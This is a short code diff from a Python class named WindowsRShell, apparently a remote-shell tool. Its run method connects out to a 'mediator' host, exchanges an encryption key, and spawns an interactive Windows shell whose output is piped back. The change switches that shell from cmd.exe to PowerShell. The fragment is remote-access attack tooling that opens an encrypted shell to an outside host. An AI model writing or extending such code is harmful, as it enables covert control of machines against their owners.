@@ -113,7 +113,7 @@ class WindowsRShell:
     def run(self):
         self.connect(self.mediatorHost)
         self.cipherKey = self.keyExchange()
-        cmdexe = subprocess.Popen(["\\windows\\system32\\cmd.exe"],
+        cmdexe = subprocess.Popen(["\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"],
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
